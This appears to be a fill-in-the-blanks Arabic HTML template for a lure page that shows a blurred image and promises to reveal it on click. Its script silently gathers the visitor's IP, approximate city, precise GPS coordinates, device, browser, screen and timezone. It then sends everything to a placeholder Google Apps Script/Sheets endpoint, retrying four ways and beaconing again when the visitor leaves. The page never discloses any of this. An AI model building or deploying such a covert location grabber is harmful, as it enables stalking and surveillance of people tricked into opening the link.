<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اسم الموقع الذي تريده</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from {
                transform: translateY(50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: rotate 10s linear infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
        }

        .header p {
            font-size: 1.1em;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }

        .content {
            padding: 40px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin-bottom: 30px;
            animation: fadeIn 1s ease-in-out;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .status-box {
            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
            color: white;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            box-shadow: 0 10px 25px rgba(116, 185, 255, 0.3);
        }

        .status-text {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .status-text.clickable {
            cursor: pointer;
            color: #ffffff;
            text-decoration: underline;
            transition: all 0.3s ease;
            padding: 10px;
            border-radius: 8px;
            background: rgba(255,255,255,0.1);
        }

        .status-text.clickable:hover {
            background: rgba(255,255,255,0.2);
            transform: translateY(-2px);
        }

        .view-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            display: none;
        }

        .view-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .view-button.show {
            display: inline-block;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-icon {
            color: #00b894;
            font-size: 1.5em;
            margin-left: 10px;
        }

        .info-panel {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            font-size: 0.9em;
            text-align: right;
            display: none;
        }

        .info-panel.show {
            display: block;
            animation: fadeIn 0.5s ease-in-out;
        }

        @media (max-width: 768px) {
            .container {
                margin: 10px;
            }
            
            .content {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>اسم الموقع الذي تريده</h1>
            <p>وصف الموقع أو الشعار الذي تريده</p>
        </div>

        <div class="content">
            <img src="https://i.imgur.com/zcb3oRL.jpeg" 
                 alt="الصورة المختارة" 
                 class="main-image" 
                 id="mainImage">

            <div class="status-box">
                <div class="status-text" id="statusText">
                    <span class="loading" id="loadingSpinner"></span>
                </div>
                
                <div class="info-panel" id="infoPanel">
                    <p><strong>📍 الموقع:</strong> <span id="locationText">غير متاح</span></p>
                    <p><strong>🌐 عنوان IP:</strong> <span id="ipAddress">جاري التحميل...</span></p>
                    <p><strong>📱 الجهاز:</strong> <span id="deviceInfo">--</span></p>
                    <p><strong>🌍 المتصفح:</strong> <span id="browserInfo">--</span></p>
                    <p><strong>🕐 المنطقة الزمنية:</strong> <span id="timezone">--</span></p>
                    <p><strong>📺 دقة الشاشة:</strong> <span id="screenRes">--</span></p>
                </div>
            </div>

            <button class="view-button" id="viewButton" onclick="viewImage()">
                🔍 مشاهدة الصورة الآن
            </button>
        </div>
    </div>

    <script>
        const GOOGLE_SCRIPT_URL = 'ضع_رابط_Google_Apps_Script_هنا';
        
        let userInfo = {
            timestamp: new Date().toLocaleString('ar-IQ'),
            page_url: window.location.href,
            referrer: document.referrer || 'مباشر'
        };

        // جمع معلومات الجهاز والمتصفح
        function collectDeviceInfo() {
            const ua = navigator.userAgent;
            
            // نوع الجهاز
            let deviceType = 'كمبيوتر';
            if (/Mobile|Android|iPhone|iPad/.test(ua)) {
                deviceType = 'جهاز محمول';
            } else if (/Tablet|iPad/.test(ua)) {
                deviceType = 'تابلت';
            }
            
            // نوع المتصفح
            let browser = 'غير معروف';
            if (ua.includes('Chrome')) browser = 'كروم';
            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
            else if (ua.includes('Safari')) browser = 'سفاري';
            else if (ua.includes('Edge')) browser = 'إيدج';
            
            // نظام التشغيل
            let os = 'غير معروف';
            if (ua.includes('Windows')) os = 'ويندوز';
            else if (ua.includes('Mac')) os = 'ماك';
            else if (ua.includes('Linux')) os = 'لينكس';
            else if (ua.includes('Android')) os = 'أندرويد';
            else if (ua.includes('iOS')) os = 'iOS';
            
            userInfo.device_type = deviceType;
            userInfo.browser = browser;
            userInfo.operating_system = os;
            userInfo.user_agent = ua;
            userInfo.screen_resolution = `${screen.width}x${screen.height}`;
            userInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            userInfo.language = navigator.language || 'غير معروف';
            
            // تحديث الواجهة
            document.getElementById('deviceInfo').textContent = `${deviceType} (${os})`;
            document.getElementById('browserInfo').textContent = browser;
            document.getElementById('screenRes').textContent = userInfo.screen_resolution;
            document.getElementById('timezone').textContent = userInfo.timezone;
        }

        // الحصول على عنوان IP
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userInfo.ip_address = data.ip;
                document.getElementById('ipAddress').textContent = data.ip;
                
                // محاولة الحصول على معلومات الموقع من IP
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const geoData = await geoResponse.json();
                    userInfo.ip_location = `${geoData.city || 'غير معروف'}, ${geoData.country_name || 'غير معروف'}`;
                } catch (e) {
                    userInfo.ip_location = 'غير متاح';
                }
            } catch (error) {
                userInfo.ip_address = 'غير متاح';
                document.getElementById('ipAddress').textContent = 'غير متاح';
            }
        }

        // الحصول على الموقع الجغرافي
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        userInfo.latitude = position.coords.latitude;
                        userInfo.longitude = position.coords.longitude;
                        userInfo.accuracy = position.coords.accuracy;
                        userInfo.location_status = 'تم الحصول عليه';
                        
                        document.getElementById('statusText').innerHTML = `
                            اضغط هنا لمشاهدة الصورة
                        `;
                        document.getElementById('statusText').classList.add('clickable');
                        document.getElementById('statusText').onclick = viewImageAndSendData;
                        document.getElementById('loadingSpinner').style.display = 'none';
                        document.getElementById('locationText').textContent = 
                            `${userInfo.latitude.toFixed(4)}, ${userInfo.longitude.toFixed(4)}`;
                        
                        // إظهار معلومات مفصلة فقط
                        document.getElementById('infoPanel').classList.add('show');
                    },
                    function(error) {
                        userInfo.location_status = 'مرفوض';
                        userInfo.location_error = 'رفض المستخدم';
                        
                        document.getElementById('statusText').innerHTML = `
                            اضغط هنا لمشاهدة الصورة
                        `;
                        document.getElementById('statusText').classList.add('clickable');
                        document.getElementById('statusText').onclick = viewImageAndSendData;
                        document.getElementById('loadingSpinner').style.display = 'none';
                        document.getElementById('locationText').textContent = 'غير متاح (مرفوض)';
                        
                        // إظهار المعلومات المتاحة فقط
                        document.getElementById('infoPanel').classList.add('show');
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                userInfo.location_status = 'غير مدعوم';
                document.getElementById('statusText').innerHTML = 'اضغط هنا لمشاهدة الصورة';
                document.getElementById('statusText').classList.add('clickable');
                document.getElementById('statusText').onclick = viewImageAndSendData;
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('locationText').textContent = 'غير مدعوم';
                document.getElementById('infoPanel').classList.add('show');
            }
        }

        // مشاهدة الصورة وإرسال البيانات (محسن للموبايل)
        async function viewImageAndSendData() {
            // إظهار الصورة واضحة
            document.getElementById('mainImage').classList.add('clear');
            
            // تحديث النص
            document.getElementById('statusText').innerHTML = `
                جاري إرسال البيانات...
                <span class="loading"></span>
            `;
            document.getElementById('statusText').classList.remove('clickable');
            document.getElementById('statusText').onclick = null;
            
            // تحديث معلومات المشاهدة
            userInfo.image_viewed = true;
            userInfo.view_timestamp = new Date().toLocaleString('ar-IQ');
            userInfo.device_type = userInfo.device_type || 'غير معروف';
            userInfo.browser = userInfo.browser || 'غير معروف';
            
            console.log('البيانات النهائية للإرسال:', userInfo);
            
            // محاولة إرسال البيانات عدة مرات
            let sent = false;
            for (let attempt = 1; attempt <= 3; attempt++) {
                console.log(`محاولة الإرسال ${attempt}/3`);
                
                sent = await sendData(userInfo);
                
                if (sent) {
                    console.log(`نجح الإرسال في المحاولة ${attempt}`);
                    break;
                }
                
                // انتظار قبل المحاولة التالية
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            // تحديث الواجهة
            if (sent) {
                document.getElementById('statusText').innerHTML = `
                    تم الموافقة على عرض الصورة 
                    <span class="success-icon">✓</span>
                `;
            } else {
                document.getElementById('statusText').innerHTML = `
                    تم عرض الصورة 
                    <span class="success-icon">✓</span>
                `;
                
                // محاولة أخيرة باستخدام sendBeacon
                if (navigator.sendBeacon) {
                    console.log('محاولة أخيرة باستخدام sendBeacon');
                    navigator.sendBeacon(
                        GOOGLE_SCRIPT_URL, 
                        'data=' + encodeURIComponent(JSON.stringify(userInfo))
                    );
                }
            }
        }

        // مشاهدة الصورة وإرسال البيانات (دالة قديمة - للحذف)
        async function viewImage() {
            // تم استبدالها بالدالة الجديدة أعلاه
        }

        // إرسال البيانات إلى Google Sheets (محسن للموبايل)
        async function sendData(data) {
            try {
                console.log('إرسال البيانات:', data);
                
                // إضافة معرف فريد للطلب
                data.request_id = 'REQ_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                
                // طريقة متعددة للإرسال
                const methods = [
                    // الطريقة الأولى: POST with FormData
                    async () => {
                        const formData = new FormData();
                        formData.append('data', JSON.stringify(data));
                        return await fetch(GOOGLE_SCRIPT_URL, {
                            method: 'POST',
                            body: formData
                        });
                    },
                    
                    // الطريقة الثانية: POST with URLSearchParams
                    async () => {
                        const params = new URLSearchParams();
                        params.append('data', JSON.stringify(data));
                        return await fetch(GOOGLE_SCRIPT_URL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: params
                        });
                    },
                    
                    // الطريقة الثالثة: GET (للموبايل)
                    async () => {
                        const url = GOOGLE_SCRIPT_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
                        return await fetch(url, { method: 'GET' });
                    },
                    
                    // الطريقة الرابعة: navigator.sendBeacon (للموبايل)
                    async () => {
                        if (navigator.sendBeacon) {
                            const success = navigator.sendBeacon(
                                GOOGLE_SCRIPT_URL, 
                                'data=' + encodeURIComponent(JSON.stringify(data))
                            );
                            return { ok: success };
                        }
                        throw new Error('sendBeacon غير متاح');
                    }
                ];
                
                // جرب كل طريقة حتى تنجح واحدة
                for (let i = 0; i < methods.length; i++) {
                    try {
                        console.log(`محاولة الطريقة ${i + 1}`);
                        const response = await methods[i]();
                        
                        if (response.ok) {
                            console.log(`نجحت الطريقة ${i + 1}`);
                            return true;
                        }
                    } catch (error) {
                        console.log(`فشلت الطريقة ${i + 1}:`, error);
                        continue;
                    }
                }
                
                console.error('فشلت جميع طرق الإرسال');
                return false;
                
            } catch (error) {
                console.error('خطأ عام في إرسال البيانات:', error);
                return false;
            }
        }

        // تشغيل الكود عند تحميل الصفحة
        window.addEventListener('load', function() {
            // جمع معلومات الجهاز مباشرة
            collectDeviceInfo();
            
            // الحصول على عنوان IP
            getIPAddress();
            
            // محاولة الحصول على الموقع الجغرافي
            setTimeout(getLocation, 1000);
        });

        // إرسال بيانات المغادرة
        window.addEventListener('beforeunload', function() {
            const exitData = {
                ...userInfo,
                action: 'page_exit',
                exit_time: new Date().toLocaleString('ar-IQ')
            };
            navigator.sendBeacon(GOOGLE_SCRIPT_URL, 'data=' + encodeURIComponent(JSON.stringify(exitData)));
        });
    </script>
</body>
</html>
